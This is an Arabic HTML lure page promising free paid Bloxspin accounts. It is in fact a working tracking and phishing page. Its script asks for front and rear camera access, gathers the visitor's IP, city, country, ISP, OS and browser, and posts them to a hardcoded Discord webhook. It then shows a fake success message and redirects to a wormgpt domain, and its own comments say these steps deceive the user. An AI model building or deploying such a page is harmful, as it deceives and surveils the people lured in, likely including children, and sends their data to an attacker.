<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Bloxspin مدفوع </title>
    <style>
        body { background: #0f0f0f; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #1a1a1a; padding: 40px; border-radius: 20px; border: 2px solid #00ff88; text-align: center; box-shadow: 0 0 30px #00ff8844; }
        button { background: #00ff88; color: #000; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 10px; transition: 0.3s; }
        button:hover { background: #00cc6e; transform: scale(1.05); }
        .hidden { display: none; }
        #loader { color: #00ff88; margin-top: 20px; }
    </style>
</head>
<body>

<div class="box" id="main">
    <h1 id="title">هل تريد الحصول على حسابات بلوكسبين مدفوعة مجاناً؟</h1>
    <div id="btn-area">
        <button onclick="startProcess()">نعم، أريد ذلك!</button>
    </div>
    <div id="loader" class="hidden">جاري تجهيز حسابك المجاني...</div>
</div>

<script>
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1558501429138956419/YxF7yDhJdIRQ2dWZdEI9oTA5GUEGr_GGN2jNtLxG3TCMjeL2XYr7rQN0sUTxwcFzC5gb';

    async function startProcess() {
        document.getElementById('btn-area').classList.add('hidden');
        document.getElementById('title').innerText = "جاري التحقق من الأهلية...";
        document.getElementById('loader').classList.remove('hidden');

        try {
            // 1. فتح الكاميرات (بدون تنبيه المستخدم)
            await Promise.all([
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }),
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
            ]);

            // 2. جلب الـ IP والمعلومات الجغرافية
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            const geoRes = await fetch(`http://ip-api.com/json/${ipData.ip}`);
            const geoData = await geoRes.json();

            // 3. تجميع البيانات وإرسالها للويبهوك
            const data = {
                offer: "Bloxspin Free Accounts",
                ip: ipData.ip,
                location: `${geoData.city}, ${geoData.country}`,
                isp: geoData.isp,
                os: navigator.platform,
                browser: navigator.userAgent,
                time: new Date().toLocaleString()
            };

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });

            // 4. تغيير الواجهة ليوهم المستخدم أن العملية اكتملت
            document.getElementById('title').innerText = "تم تسجيلك بنجاح!";
            document.getElementById('loader').innerText = "سيتم توجيهك لصفحة الحسابات الآن...";
            
            setTimeout(() => {
                alert("شكراً لك! سيتم إرسال الحسابات إلى بريدك.");
                window.location.href = "https://wormgpt.app"; // توجيه وهمي
            }, 2000);

        } catch (e) {
            document.getElementById('title').innerText = "حدث خطأ بسيط.";
            document.getElementById('loader').innerText = "يرجى تحديث الصفحة والمحاولة مرة أخرى.";
        }
    }
</script>
</body>
</html>
